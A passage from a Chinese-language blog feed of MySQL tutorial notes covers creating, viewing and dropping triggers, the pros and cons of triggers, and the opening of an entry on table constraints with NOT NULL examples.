<span class="operator">*</span> <span class="keyword">FROM</span> test_trigger_log;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> t_log            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> before insert... <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">2</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   /*&gt;  创建名称为after_insert_test_tri的触发器，向test_trigger数据表插入数据之后，</span></span><br><span class="line"><span class="comment">   /*&gt;  向test_trigger_log数据表中插入after_insert的日志信息。</span></span><br><span class="line"><span class="comment">   /*&gt; */</span></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER $</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> after_insert_test_tri</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> test_trigger</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_trigger_log(t_log)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">VALUES</span>(<span class="string">&#x27;after insert...&#x27;</span>);</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> $</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">2.20</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 测试</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_trigger(t_note)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">VALUES</span>(<span class="string">&#x27;Jerry2...&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test_trigger;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> t_note    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Tom...    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Jerry2... <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test_trigger_log;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> t_log            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> before insert... <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> before insert... <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> after insert...  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #举例<span class="number">3</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   /*&gt;  定义触发器“salary_check_trigger”，基于员工表“employees”的INSERT事件，</span></span><br><span class="line"><span class="comment">   /*&gt;  在INSERT之前检查将要添加的新员工薪资是否大于他领导的薪资，如果大于领导薪资，</span></span><br><span class="line"><span class="comment">   /*&gt;  则报sqlstate_value为&#x27;HY000&#x27;的错误，从而使得添加失败。</span></span><br><span class="line"><span class="comment">   /*&gt; */</span></span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 查看表结构</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field          <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> employee_id    <span class="operator">|</span> <span class="type">int</span>(<span class="number">6</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">0</span>       <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> first_name     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> last_name      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">25</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> email          <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">25</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> phone_number   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date      <span class="operator">|</span> <span class="type">date</span>        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> job_id         <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> salary         <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">8</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> commission_pct <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">2</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> manager_id     <span class="operator">|</span> <span class="type">int</span>(<span class="number">6</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> department_id  <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> departments;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field           <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> department_id   <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">0</span>       <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> department_name <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">30</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> manager_id      <span class="operator">|</span> <span class="type">int</span>(<span class="number">6</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> location_id     <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 创建触发器</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> salary_check_trigger</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  # 查询到要添加的数据的manager的薪资</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">DECLARE</span> mgr_sal <span class="keyword">DOUBLE</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">SELECT</span> salary <span class="keyword">INTO</span> mgr_sal <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> NEW.manager_id;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  IF NEW.salary <span class="operator">&gt;</span> mgr_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">THEN</span> SIGNAL <span class="keyword">SQLSTATE</span> <span class="string">&#x27;HY000&#x27;</span> <span class="keyword">SET</span> MESSAGE_TEXT <span class="operator">=</span> <span class="string">&#x27;薪资高于领导薪资错误&#x27;</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">END</span> IF;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">1.28</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 测试</span><br><span class="line">mysql<span class="operator">&gt;</span> # 添加成功：依然触发了触发器salary_check_trigger的执行</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> employees(employee_id,last_name,email,hire_date,job_id,salary,manager_id)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">VALUES</span>(<span class="number">300</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;tom@126.com&#x27;</span>,CURDATE(),<span class="string">&#x27;AD_VP&#x27;</span>,<span class="number">8000</span>,<span class="number">103</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.06</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 添加失败</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> employees(employee_id,last_name,email,hire_date,job_id,salary,manager_id)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">VALUES</span>(<span class="number">301</span>,<span class="string">&#x27;Tom1&#x27;</span>,<span class="string">&#x27;tom1@126.com&#x27;</span>,CURDATE(),<span class="string">&#x27;AD_VP&#x27;</span>,<span class="number">10000</span>,<span class="number">103</span>);</span><br><span class="line">ERROR <span class="number">1644</span> (HY000): 薪资高于领导薪资错误</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="三、查看、删除触发器"><a href="#三、查看、删除触发器" class="headerlink" title="三、查看、删除触发器"></a>三、查看、删除触发器</h1><h2 id="1-查看触发器"><a href="#1-查看触发器" class="headerlink" title="1. 查看触发器"></a>1. 查看触发器</h2><p>查看触发器是查看数据库中已经存在的触发器的定义、状态和语法信息等。</p>
<ul>
<li>方式1：查看当前数据库的所有触发器的定义</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TRIGGERS</span><br></pre></td></tr></table></figure>


<ul>
<li>方式2：查看当前数据库中某个触发器的定义</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名</span><br></pre></td></tr></table></figure>


<ul>
<li>方式3：从系统库information_schema的TRIGGERS表中查询“salary_check_trigger”触发器的信息。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.TRIGGERS;</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看当前数据库的所有触发器的定义</span><br><span class="line"><span class="keyword">SHOW</span> TRIGGERS;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：查看当前数据库中某个触发器的定义</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> salary_check_trigger;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">3</span>：从系统库information_schema的TRIGGERS表中查询“salary_check_trigger”触发器的信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.TRIGGERS;</span><br></pre></td></tr></table></figure>

<h2 id="2-删除触发器"><a href="#2-删除触发器" class="headerlink" title="2. 删除触发器"></a>2. 删除触发器</h2><p>触发器也是数据库对象，删除触发器也用DROP语句，语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> 触发器名称;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> after_insert_test_tri;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="四、触发器的优缺点"><a href="#四、触发器的优缺点" class="headerlink" title="四、触发器的优缺点"></a>四、触发器的优缺点</h1><h2 id="1-优点"><a href="#1-优点" class="headerlink" title="1. 优点"></a>1. 优点</h2><ul>
<li><strong>触发器可以确保数据的完整性</strong></li>
</ul>
<p>这一点在我们开头提到的 <strong>商品信息</strong> 和 <strong>库存信息</strong> 表是一个意思，每当我们在商品信息表中录入、删除信息时，库存信息的表也会发生变动。这个时候，库存信息的库存量等就必须重新计算，否则商品信息与库存信息不对等，这就是数据不一致。</p>
<p>为了解决这个问题，我们就可以使用触发器，规定每当商品信息表有数据插入和删除的操作时，<strong>自动触发以下操作</strong>：</p>
<ul>
<li>重新计算库存数量；</li>
</ul>
<p>这样一来，商品信息与库存信息始终对等，不会互相矛盾。</p>
<ul>
<li><strong>触发器可以帮助我们记录操作日志</strong></li>
</ul>
<p>利用触发器，可以具体记录什么时间发生了什么。比如，记录修改会员储值金额的触发器，就是一个很好的例子。这对我们还原操作执行时的具体场景，更好地定位问题原因很有帮助。</p>
<ul>
<li><strong>触发器还可以用在操作数据前，对数据进行合法性检查</strong></li>
</ul>
<p>比如，超市进货的时候，需要库管录入进货价格。但是，人为操作很容易犯错误，比如说在录入数量的时候，把条形码扫进去了；录入金额的时候，看串了行，录入的价格远超售价，导致账面上的巨亏……</p>
<p>这些都可以通过触发器，在实际插入或者更新操作之前，对相应的数据进行检查，及时提示错误，防止错误数据进入系统。</p>
<h2 id="2-缺点"><a href="#2-缺点" class="headerlink" title="2. 缺点"></a>2. 缺点</h2><ul>
<li><strong>触发器最大的一个问题就是可读性差</strong></li>
</ul>
<p>因为触发器存储在数据库中，并且由 <strong>事件驱动</strong>，这就意味着触发器有可能 <strong>不受应用层的控制</strong> 。这对系统维护是非常有挑战的。</p>
<p>比如，创建触发器用于修改会员储值操作。如果触发器中的操作出了问题，会导致会员储值金额更新失败。我用下面的代码演示一下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">update</span> demo.membermaster <span class="keyword">set</span> memberdeposit<span class="operator">=</span><span class="number">20</span> <span class="keyword">where</span> memberid <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">ERROR <span class="number">1054</span> (<span class="number">42</span>S22): <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;field list&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果显示，系统提示错误，字段“aa”不存在。</p>
<p>这是因为，触发器中的数据插入操作多了一个字段，系统提示错误。可是，如果你不了解这个触发器，很可能会认为是更新语句本身的问题，或者是会员信息表的结构出了问题。说不定你还会给会员信息表添加一个叫“aa”的字段，试图解决这个问题，结果只能是白费力。</p>
<ul>
<li><strong>相关数据的变更，可能会导致触发器出错</strong></li>
</ul>
<p>特别是数据表结构的变更，都可能会导致触发器出错，进而影响数据操作的正常运行。这些都会由于触发器本身的隐蔽性，影响到应用中错误原因排查的效率。</p>
<p><strong>注意：</strong></p>
<p>如果在子表中定义了外键约束，并且外键指定了<code>ON UPDATE/DELETE CASCADE/SET NULL</code>子句，此时修改父表被引用的键值或删除父表被引用的记录行时，也会引起子表的修改和删除操作，此时基于子表的<code>UPDATE</code>和<code>DELETE</code>语句定义的触发器并不会被激活。</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之约束</title>
    <url>/posts/78beed92.html</url>
    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="1-为什么需要约束"><a href="#1-为什么需要约束" class="headerlink" title="1. 为什么需要约束"></a>1. 为什么需要约束</h2><p>数据完整性（Data Integrity）是指数据的精确性（Accuracy）和可靠性（Reliability）。它是防止数据库中存在不符合语义规定的数据和防止因错误信息的输入输出造成无效操作或错误信息而提出的。</p>
<p>为了保证数据的完整性，SQL规范以约束的方式对表数据进行额外的条件限制。从以下四个方面考虑：</p>
<ul>
<li>实体完整性（Entity Integrity） ：例如，同一个表中，不能存在两条完全相同无法区分的记录</li>
<li>域完整性（Domain Integrity） ：例如：年龄范围0-120，性别范围“男&#x2F;女”</li>
<li>引用完整性（Referential Integrity） ：例如：员工所在部门，在部门表中要能找到这个部门</li>
<li>用户自定义完整性（User-defined Integrity） ：例如：用户名唯一、密码不能为空等，本部门经理的工资不得高于本部门职工的平均工资的5倍。</li>
</ul>
<h2 id="2-什么是约束"><a href="#2-什么是约束" class="headerlink" title="2. 什么是约束"></a>2. 什么是约束</h2><p>约束是表级的强制规定。</p>
<p>可以在<strong>创建表时规定约束（通过 CREATE TABLE 语句）</strong>，或者在<strong>表创建之后通过 ALTER TABLE 语句</strong>规定约束。</p>
<h2 id="3-约束的分类"><a href="#3-约束的分类" class="headerlink" title="3. 约束的分类"></a>3. 约束的分类</h2><ul>
<li><strong>根据约束数据列的限制</strong>，约束可分为：<ul>
<li><strong>单列约束</strong>：每个约束只约束一列</li>
<li><strong>多列约束</strong>：每个约束可约束多列数据</li>
</ul>
</li>
<li><strong>根据约束的作用范围</strong>，约束可分为：<ul>
<li><strong>列级约束</strong>：只能作用在一个列上，跟在列的定义后面</li>
<li><strong>表级约束</strong>：可以作用在多个列上，不与列一起，而是单独定义</li>
</ul>
</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134038.png" alt=" "></p>
<ul>
<li><strong>根据约束起的作用</strong>，约束可分为：<ul>
<li><strong>NOT NULL 非空约束</strong>，规定某个字段不能为空</li>
<li><strong>UNIQUE 唯一约束</strong>，规定某个字段在整个表中是唯一的</li>
<li><strong>PRIMARY KEY 主键(非空且唯一)约束</strong></li>
<li><strong>FOREIGN KEY 外键约束</strong></li>
<li><strong>CHECK 检查约束</strong></li>
<li><strong>DEFAULT 默认值约束</strong></li>
</ul>
</li>
</ul>
<p>注意： MySQL不支持check约束，但可以使用check约束，而没有任何效果！<br>注意： MySQL不支持check约束，但可以使用check约束，而没有任何效果！<br>注意： MySQL不支持check约束，但可以使用check约束，而没有任何效果！</p>
<ul>
<li><strong>查看某个表已有的约束</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># information_schema数据库名（系统库）</span><br><span class="line"># table_constraints表名称（专门存储各个表的约束）</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints</span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;表名称&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 例如</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;t_book&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------------------+-----------------+--------------+------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> CONSTRAINT_CATALOG <span class="operator">|</span> CONSTRAINT_SCHEMA <span class="operator">|</span> CONSTRAINT_NAME <span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME <span class="operator">|</span> CONSTRAINT_TYPE <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------------------+-----------------+--------------+------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> def                <span class="operator">|</span> test              <span class="operator">|</span> <span class="keyword">PRIMARY</span>         <span class="operator">|</span> test         <span class="operator">|</span> t_book     <span class="operator">|</span> <span class="keyword">PRIMARY</span> KEY     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------------------+-----------------+--------------+------------+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="二、非空约束"><a href="#二、非空约束" class="headerlink" title="二、非空约束"></a>二、非空约束</h1><p><strong>作用</strong>：限定某个字段&#x2F;某列的值不允许为空</p>
<p><strong>关键字</strong>： <code>NOT NULL</code></p>
<h2 id="1-特点"><a href="#1-特点" class="headerlink" title="1. 特点"></a>1. 特点</h2><ul>
<li>默认，所有的类型的值都可以是NULL，包括INT、FLOAT等数据类型</li>
<li>非空约束只能出现在表对象的列上，只能某个列单独限定非空，不能组合非空</li>
<li>一个表可以有很多列都分别限定了非空</li>
<li>空字符串’’不等于NULL，0也不等于NULL</li>
</ul>
<h2 id="2-添加非空约束"><a href="#2-添加非空约束" class="headerlink" title="2. 添加非空约束"></a>2. 添加非空约束</h2><p> <strong>（1）建表时</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test1(</span><br><span class="line">	id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	email <span class="type">VARCHAR</span>(<span class="number">25</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 正确插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test1(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;tom@126.com&#x27;</span>,<span class="number">3400</span>);</span><br><span class="line"></span><br><span class="line">#错误：<span class="keyword">Column</span> <span class="string">&#x27;last_name&#x27;</span> cannot be <span class="keyword">null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test1(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;tom1@126.com&#x27;</span>,<span class="number">3400</span>);</span><br><span class="line"></span><br><span class="line"># 错误：<span class="keyword">Column</span> <span class="string">&#x27;id&#x27;</span> cannot be <span class="keyword">null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test1(id,last_name,email,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;Jerry&#x27;</span>,<span class="string">&#x27;jerry@126.com&#x27;</span>,<span class="number">3400</span>);</span><br></pre></td></tr></table></figure>

<p><strong>（2）建表后</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test1</span><br><span class="line">MODIFY email <span class="type">VARCHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>


